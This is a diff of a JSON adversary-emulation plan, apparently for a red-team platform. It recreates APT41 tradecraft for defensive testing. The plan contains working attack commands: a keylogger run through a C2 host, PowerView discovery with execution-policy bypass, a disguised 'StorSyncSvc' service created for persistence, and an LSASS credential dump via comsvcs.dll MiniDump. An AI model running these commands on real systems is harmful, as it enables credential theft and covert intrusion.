@@ -1,31 +1,23 @@
 {
     "threat": {
         "category": "User-Defined",
-        "description": "APT41 Adversary Emulations as documented by: https://security-tzu.com/2020/09/23/emulation-plan-for-apt41/",
-        "display_name": "APT41",
-        "name": "APT41",
+        "description": "APT41 Emulation Plan based on https://security-tzu.com/2020/09/23/emulation-plan-for-apt41/",
+        "display_name": "Threat Thursday - APT41",
+        "name": "Threat Thursday - APT41",
         "operating_system_name": "windows",
         "script": {
             "0": {
-                "conf": {
-                    "--cp": "unicorn.scythedemo.com:443",
-                    "--secure": true
-                },
+                "conf": "--cp unicorn.scythedemo.com:443 --secure true",
                 "module": "https",
                 "type": "initialization"
             },
             "1": {
-                "name": "remote_server",
-                "type": "assign",
-                "value": "BLANK"
-            },
-            "2": {
                 "module": "loader",
                 "module_to_load": "keylogger",
                 "request": "--load keylogger",
                 "type": "message"
             },
-            "3": {
+            "2": {
                 "depends_on": "8085957f-b422-48cb-960b-1f077790299d",
                 "module": "keylogger",
                 "request": "--start",
@@ -37,7 +29,7 @@
                 ],
                 "type": "message"
             },
-            "4": {
+            "3": {
                 "module": "loader",
                 "module_to_load": "run",
                 "request": "--load run",
@@ -46,7 +38,7 @@
                 ],
                 "type": "message"
             },
-            "5": {
+            "4": {
                 "module": "loader",
                 "module_to_load": "upsh",
                 "request": "--load upsh",
@@ -55,7 +47,7 @@
                 ],
                 "type": "message"
             },
-            "6": {
+            "5": {
                 "module": "loader",
                 "module_to_load": "downloader",
                 "request": "--load downloader",
@@ -64,7 +56,7 @@
                 ],
                 "type": "message"
             },
-            "7": {
+            "6": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "cmd /c mkdir \"%USERPROFILE%\\Desktop\\APT41\"",
@@ -73,12 +65,12 @@
                 ],
                 "type": "message"
             },
-            "8": {
+            "7": {
                 "name": "STEP",
                 "type": "assign",
                 "value": "DISCOVERY"
             },
-            "9": {
+            "8": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "whoami",
@@ -90,7 +82,7 @@
                 ],
                 "type": "message"
             },
-            "10": {
+            "9": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "ipconfig /all",
@@ -99,7 +91,7 @@
                 ],
                 "type": "message"
             },
-            "11": {
+            "10": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "netstat -ant",
@@ -111,7 +103,7 @@
                 ],
                 "type": "message"
             },
-            "12": {
+            "11": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "netstat -r",
@@ -123,7 +115,7 @@
                 ],
                 "type": "message"
             },
-            "13": {
+            "12": {
                 "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
                 "module": "downloader",
                 "request": "--src \"VFS:/shared/APT41/PowerView.ps1\" --dest \"%USERPROFILE%\\Desktop\\APT41\\PowerView.ps1\"",
@@ -132,7 +124,7 @@
                 ],
                 "type": "message"
             },
-            "14": {
+            "13": {
                 "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
                 "module": "run",
                 "request": "powershell.exe -exec bypass -Command \"&{Import-Module %USERPROFILE%\\Desktop\\APT41\\PowerView.ps1;Get-NetRDPSession}\"",
@@ -141,7 +133,7 @@
                 ],
                 "type": "message"
             },
-            "15": {
+            "14": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "cmd /c net share",
@@ -153,7 +145,7 @@
                 ],
                 "type": "message"
             },
-            "16": {
+            "15": {
                 "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
                 "module": "run",
                 "request": "powershell.exe -exec bypass -Command \"&{Import-Module %USERPROFILE%\\Desktop\\APT41\\PowerView.ps1;Get-NetShare}\"",
@@ -162,7 +154,7 @@
                 ],
                 "type": "message"
             },
-            "17": {
+            "16": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "powershell.exe -exec bypass -Command \"&{Import-Module %USERPROFILE%\\Desktop\\APT41\\PowerView.ps1;Get-Forest}\"",
@@ -171,7 +163,7 @@
                 ],
                 "type": "message"
             },
-            "18": {
+            "17": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "powershell.exe -exec bypass -Command \"&{Import-Module %USERPROFILE%\\Desktop\\APT41\\PowerView.ps1;Get-ForestDomain}\"",
@@ -180,7 +172,7 @@
                 ],
                 "type": "message"
             },
-            "19": {
+            "18": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "powershell.exe -exec bypass -Command \"&{Import-Module %USERPROFILE%\\Desktop\\APT41\\PowerView.ps1;Get-Domain}\"",
@@ -189,7 +181,7 @@
                 ],
                 "type": "message"
             },
-            "20": {
+            "19": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "powershell.exe -exec bypass -Command \"&{Import-Module %USERPROFILE%\\Desktop\\APT41\\PowerView.ps1;Get-DomainTrust}\"",
@@ -198,7 +190,7 @@
                 ],
                 "type": "message"
             },
-            "21": {
+            "20": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "powershell.exe -exec bypass -Command \"&{Import-Module %USERPROFILE%\\Desktop\\APT41\\PowerView.ps1;Get-DomainTrustMapping}\"",
@@ -207,10 +199,19 @@
                 ],
                 "type": "message"
             },
-            "22": {
+            "21": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "cmd /c nltest /domain_trusts > %USERPROFILE%\\Desktop\\APT41\\ad_trustdmp.txt",
+                "rtags": [
+                    "att&ck-technique:T1482"
+                ],
+                "type": "message"
+            },
+            "22": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c type %USERPROFILE%\\Desktop\\APT41\\ad_trustdmp.txt",
                 "rtags": [
                     "att&ck-technique:T1482"
                 ],
@@ -336,7 +337,7 @@
             },
             "37": {
                 "function": "ifelse",
-                "next": 47,
+                "next": 50,
                 "step": 36,
                 "type": "decision",
                 "value": "High",
@@ -370,11 +371,29 @@
                 "type": "message"
             },
             "41": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c sc create \"StorSyncSvc\" binPath= \"%SystemRoot%\\system32\\svchost.exe -k \"StorSyncSvc\" type= share start= auto error= ignore DisplayName= \"StorSyncSvc\"",
+                "rtags": [
+                    "att&ck-technique:T1033"
+                ],
+                "type": "message"
+            },
+            "42": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c sc query \"StorSyncSvc\"",
+                "rtags": [
+                    "att&ck-technique:T1033"
+                ],
+                "type": "message"
+            },
+            "43": {
                 "name": "STEP",
                 "type": "assign",
                 "value": "CREDENTIAL ACCESS"
             },
-            "42": {
+            "44": {
                 "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
                 "module": "upsh",
                 "request": "--cmd \"Invoke-Command -ScriptBlock {C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\\lsass-comsvcs.dmp full}\"",
@@ -386,7 +405,7 @@
                 ],
                 "type": "message"
             },
-            "43": {
+            "45": {
                 "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
                 "module": "upsh",
                 "request": "--cmd \"Invoke-Command -ScriptBlock {Remove-Item $env:TEMP\\lsass-comsvcs.dmp -ErrorAction Ignore\n}\"",
@@ -399,18 +418,18 @@
                 ],
                 "type": "message"
             },
-            "44": {
+            "46": {
                 "name": "STEP",
                 "type": "assign",
                 "value": "CLEAN UP"
             },
-            "45": {
+            "47": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "net localgroup Administrators APT41 /del",
                 "type": "message"
             },
-            "46": {
+            "48": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "net user APT41 /del",
@@ -419,7 +438,16 @@
                 ],
                 "type": "message"
             },
-            "47": {
+            "49": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c sc delete \"StorSyncSvc\"",
+                "rtags": [
+                    "att&ck-technique:T1033"
+                ],
+                "type": "message"
+            },
+            "50": {
                 "depends_on": "8085957f-b422-48cb-960b-1f077790299d",
                 "module": "keylogger",
                 "request": "--current",
@@ -428,7 +456,7 @@
                 ],
                 "type": "message"
             },
-            "48": {
+            "51": {
                 "depends_on": "8085957f-b422-48cb-960b-1f077790299d",
                 "module": "keylogger",
                 "request": "--stop",
@@ -437,7 +465,7 @@
                 ],
                 "type": "message"
             },
-            "49": {
+            "52": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "cmd /c REG DELETE HKEY_CURRENT_USER\\Software\\ExampleRegKey /f",
@@ -447,7 +475,7 @@
                 ],
                 "type": "message"
             },
-            "50": {
+            "53": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "cmd /c SCHTASKS /DELETE /TN \"MyTasks\\Example Task\" /F",
@@ -456,7 +484,7 @@
                 ],
                 "type": "message"
             },
-            "51": {
+            "54": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "cmd /c rmdir /Q /S \"\"%USERPROFILE%\\Desktop\\APT41\"\"",
@@ -465,7 +493,7 @@
                 ],
                 "type": "message"
             },
-            "52": {
+            "55": {
                 "module": "controller",
                 "request": "--shutdown",
                 "rtags": [
